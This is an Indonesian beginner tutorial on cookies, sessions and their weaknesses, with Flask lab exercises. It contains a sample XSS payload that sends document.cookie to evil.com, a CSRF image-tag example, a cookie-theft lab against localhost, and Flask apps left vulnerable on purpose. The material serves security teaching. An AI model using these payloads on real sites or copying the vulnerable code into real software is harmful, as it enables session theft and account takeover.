📚 Belajar Session & Cookie untuk Pemula

Panduan lengkap memahami Cookie, Session, kerentanannya, dan praktikum langsung dengan Flask.

1. Pengantar

HTTP adalah stateless protocol — artinya server tidak "ingat" siapa kamu di request sebelumnya. Bayangkan kamu login ke sebuah website, lalu pindah ke halaman lain, tiba-tiba diminta login lagi. Sangat menyebalkan, kan?

Di sinilah Cookie dan Session berperan: keduanya menyimpan "ingatan" tentang siapa kamu di antara request.

2. Apa itu Cookie?

Cookie adalah potongan kecil data (biasanya < 4KB) yang dikirim server ke browser, lalu browser menyimpannya dan mengirimkannya kembali ke server pada setiap request berikutnya ke domain yang sama.

Cara Kerja Sederhana

1. Browser → Server : GET /login
2. Server → Browser : HTTP/1.1 200 OK
                      Set-Cookie: user=andi; Path=/
3. Browser menyimpan cookie "user=andi"
4. Browser → Server : GET /dashboard
                      Cookie: user=andi

Atribut Penting Cookie

AtributFungsi
Name=ValueData utama cookie
DomainDomain mana yang boleh menerima cookie
PathURL path yang boleh mengakses cookie
Expires / Max-AgeKapan cookie kadaluarsa
SecureHanya dikirim via HTTPS
HttpOnlyTidak bisa diakses JavaScript (anti XSS)
SameSiteStrict / Lax / None (anti CSRF)
✅ Contoh Set-Cookie yang Aman 
Set-Cookie: session_id=abc123; 
            Path=/; 
            Secure; 
            HttpOnly; 
            SameSite=Strict; 
            Max-Age=3600

3. Apa itu Session?

Session adalah data yang disimpan di sisi server untuk mengidentifikasi user selama periode tertentu. Server hanya mengirim session ID ke browser (biasanya via cookie), sedangkan data sebenarnya (username, role, dll) tetap di server.

Alur Session

1. User login → Server buat session_id = "xyz789"
2. Server simpan: xyz789 → {user: "andi", role: "admin"}
3. Server kirim cookie: session_id=xyz789
4. Request berikutnya: Browser kirim session_id=xyz789
5. Server cek session storage → dapat data user

4. Perbandingan Cookie vs Session

AspekCookieSession
Lokasi dataBrowser (client)Server
KeamananKurang aman (bisa diedit user)Lebih aman
Beban serverRinganLebih berat
Kapasitas~4KBTak terbatas
Contoh dataPreferensi tema, bahasaLogin state, cart

5. ⚠️ Kerentanan Umum

5.1 Session Hijacking Tinggi

Penyerang mencuri session_id korban, lalu menggunakannya untuk mengakses akun korban.

Penyebab: cookie tanpa HttpOnly, XSS, sniffing di HTTP.

5.2 Session Fixation Tinggi

Penyerang memaksa korban menggunakan session_id yang sudah diketahui penyerang.

Skenario: korban login dengan session_id attacker123, penyerang tinggal pakai ID itu.

5.3 XSS (Cross-Site Scripting) Kritis

Script jahat menyisipkan document.cookie dan mengirim ke server penyerang.

<script>fetch('http://evil.com?c='+document.cookie)</script>

Mitigasi: HttpOnly, validasi output, CSP.

5.4 CSRF (Cross-Site Request Forgery) Tinggi

Penyerang membuat korban tanpa sadar mengirim request yang sudah terautentikasi.

<img src="http://bank.com/transfer?to=attacker&amount=1000">

Mitigasi: CSRF token, SameSite cookie.

5.5 Cookie Tossing

Penyerang men-set cookie dengan path/domain berbeda untuk menimpa cookie korban.

5.6 Predictable Session ID

Jika ID dibuat dengan pola mudah ditebak (misal increment), penyerang bisa brute-force.

5.7 Session Tidak Di-invalidate

Session lama yang tidak dihapus setelah logout bisa disalahgunakan.

7. Lab Praktikum

1
Cookie Rentan (Vulnerable Cookie)
from flask import Flask, request, make_response

app = Flask(__name__)

@app.route('/')
def index():
    user = request.cookies.get('user', 'Guest')
    return f'''
        <h1>Halo, {user}!</h1>
        <a href="/set?user=andi">Login sebagai Andi</a><br>
        <a href="/logout">Logout</a>
        <hr>
        <p>Buka DevTools → Console, ketik: <code>document.cookie</code></p>
    '''

@app.route('/set')
def set_cookie():
    user = request.args.get('user', 'Guest')
    resp = make_response(f'<h2>Cookie diset untuk: {user}</h2><a href="/">Kembali</a>')
    # ❌ RENTAN: tanpa HttpOnly, tanpa Secure, tanpa SameSite
    resp.set_cookie('user', user)
    return resp

@app.route('/logout')
def logout():
    resp = make_response('<h2>Logout</h2><a href="/">Kembali</a>')
    resp.delete_cookie('user')
    return resp

if __name__ == '__main__':
    app.run(debug=True, port=5000)
🎯 Tugas:
  1. Jalankan: python main.py
  2. Buka http://localhost:5000, klik Login sebagai Andi
  3. Buka DevTools → Console → ketik document.cookie
  4. Eksploitasi: jalankan document.cookie = "user=admin", refresh halaman → Anda jadi "admin"! 🚨
  5. Diskusi: Kenapa ini berbahaya? Bagaimana mencegahnya?

Session Predictable ID (Rentan)
from flask import Flask, request, redirect, session

app = Flask(__name__)
app.secret_key = 'secret'

counter = 1000  # ❌ predictable!

@app.route('/')
def index():
    if 'user' in session:
        return f'''
            <h1>Dashboard - {session['user']}</h1>
            <p>Session ID: {session.get('sid')}</p>
            <a href="/logout">Logout</a>
        '''
    return '<a href="/login">Login</a>'

@app.route('/login')
def login():
    global counter
    counter += 1
    session['sid'] = counter  # ❌ increment = mudah ditebak
    session['user'] = 'andi'
    return redirect('/')

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/')

if __name__ == '__main__':
    app.run(debug=True, port=5001)
🎯 Tugas:
  1. Jalankan aplikasi, login, catat sid (misal: 1001)
  2. Logout, login lagi → sid jadi 1002, dst.
  3. Eksploitasi: karena ID sequential, penyerang bisa menebak session user lain
  4. Diskusi: Bagaimana session ID yang aman dibuat?
3
Session Aman (Best Practice)
from flask import Flask, redirect, session, make_response
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE='Lax',
    SESSION_COOKIE_SECURE=False,
    PERMANENT_SESSION_LIFETIME=1800,
)

@app.route('/')
def index():
    if 'user' in session:
        return f'''
            <h1>Dashboard Aman - {session['user']}</h1>
            <p>Session ID: {session.get('sid')}</p>
            <a href="/logout">Logout</a>
            <hr>
            <p>Coba ketik di Console: <code>document.cookie</code></p>
        '''
    return '<a href="/login">Login</a>'

@app.route('/login')
def login():
    session['sid'] = secrets.token_urlsafe(32)  # ✅ random aman
    session['user'] = 'andi'
    session.permanent = True
    return redirect('/')

@app.route('/logout')
def logout():
    session.clear()
    resp = make_response('<h2>Logout berhasil.</h2><a href="/">Kembali</a>')
    return resp

if __name__ == '__main__':
    app.run(debug=True, port=5002)
🎯 Tugas:
  1. Jalankan aplikasi, login
  2. Buka Console → document.cookie → Anda tidak bisa melihat session (karena HttpOnly)
  3. Perhatikan session ID berupa string random panjang
  4. Bandingkan dengan Lab 1 & 2 — apa yang berubah?

Simulasi Serangan XSS → Session Theft
from flask import Flask, request, make_response

app = Flask(__name__)

@app.route('/')
def index():
    name = request.args.get('name', '')  # ❌ tidak disanitasi
    return f'''
        <h1>Halo, {name}</h1>
        <form>
            <input name="name" placeholder="Nama Anda">
            <button>Kirim</button>
        </form>
        <p>Login status: {request.cookies.get('session_id', 'Belum login')}</p>
    '''

@app.route('/setlogin')
def setlogin():
    resp = make_response('<h2>Login! <a href="/">Kembali</a></h2>')
    resp.set_cookie('session_id', 'SECRET_SESSION_12345')  # ❌ tanpa HttpOnly
    return resp

@app.route('/steal')
def steal():
    stolen = request.args.get('c', '')
    print(f"\n🚨 [ATTACKER] Cookie dicuri: {stolen}\n")
    return '<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=">'

if __name__ == '__main__':
    app.run(debug=True, port=5003)
🎯 Tugas:
  1. Jalankan, kunjungi /setlogin untuk set cookie
  2. Kunjungi URL XSS: 
    http://localhost:5003/?name=<script>fetch('http://localhost:5003/steal?c='+document.cookie)</script>
  3. Lihat terminal server → cookie "dicuri" dan di-print 🚨
  4. Diskusi: bagaimana mencegahnya? (sanitasi input, HttpOnly, CSP)

8. 📋 Ringkasan Best Practice

✅ DO
  • Gunakan HttpOnly + Secure + SameSite pada cookie session
  • Generate session ID dengan CSPRNG (secrets.token_urlsafe(32))
  • Regenerate session ID setelah login (anti session fixation)
  • Invalidate session saat logout
  • Set timeout session (idle & absolute)
  • Simpan session di server-side store (Redis, DB) untuk produksi
  • Gunakan CSRF token untuk form penting
❌ DON'T
  • Jangan simpan data sensitif di cookie (password, role)
  • Jangan pakai session ID yang predictable
  • Jangan lupa menutup session lama setelah logout
  • Jangan akses document.cookie untuk data autentikasi
  • Jangan set cookie tanpa atribut keamanan
